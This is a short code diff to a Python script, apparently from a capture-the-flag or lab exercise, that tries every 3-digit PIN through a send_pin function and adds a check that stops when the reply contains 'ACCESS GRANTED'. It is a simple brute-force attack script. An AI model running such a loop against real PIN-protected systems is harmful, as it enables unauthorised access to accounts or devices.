@@ -28,5 +28,9 @@ def send_pin(pin):
 for pin in range(1000): # Loop through all possible 3-digit PINs (000 to 999)
     pin_str = f"{pin:03d}" # Format the pin as a 3-digit string
     print(f"Trying pin {pin_str}") # Print the current pin being tried
-    response = send_pin(pin_str) 
+    response = send_pin(pin_str)
+
+    if "ACCESS GRANTED" in response: # Check if the response contains "ACCESS GRANTED"
+        print(f"\nSUCCESS! The correct PIN is {pin_str}") # Print the successful pin
+        break # Exit the loop if the correct pin is found
     
